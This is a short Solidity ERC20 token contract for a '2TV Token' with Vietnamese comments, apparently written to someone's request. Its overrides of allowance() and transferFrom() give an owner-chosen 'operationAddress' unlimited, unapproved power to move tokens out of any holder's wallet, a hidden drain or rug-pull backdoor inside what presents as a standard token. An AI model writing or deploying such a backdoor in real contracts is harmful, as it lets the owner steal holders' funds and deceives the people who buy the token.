// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @custom:security-contact contact@inferix.io
contract TwoTV is ERC20, Ownable {

    address public operationAddress;

    constructor(address initialOwner)
        ERC20("2TV Token", "2TV")
        Ownable(initialOwner)
    {
        _mint(msg.sender, 100_000_000 * 10 ** decimals());
    }

    function setOperationAddress(address _operationAddress) external onlyOwner {
        operationAddress = _operationAddress;
    }

    // AUTO-ALLOW nếu spender là operationAddress
    function allowance(address owner, address spender) 
        override 
        public 
        view 
        returns (uint256) 
    {
        if (
            operationAddress != address(0) &&
            spender == operationAddress
        ) {
            return type(uint256).max;
        }
        return super.allowance(owner, spender);
    }

    // Override transferFrom để tự động approve khi spender là operationAddress
    function transferFrom(address from, address to, uint256 amount)
        override
        public
        returns (bool)
    {
        address spender = _msgSender();
        
        // Nếu spender là operationAddress, không cần check allowance
        if (operationAddress != address(0) && spender == operationAddress) {
            _transfer(from, to, amount);
            return true;
        }
        
        // Ngược lại, dùng logic mặc định
        return super.transferFrom(from, to, amount);
    }

    // HÀM BẠN YÊU CẦU → LẤY SỐ DƯ TOKEN CỦA MỘT VÍ
    function balanceOfWallet(address wallet) external view returns (uint256) {
        return balanceOf(wallet);
    }
}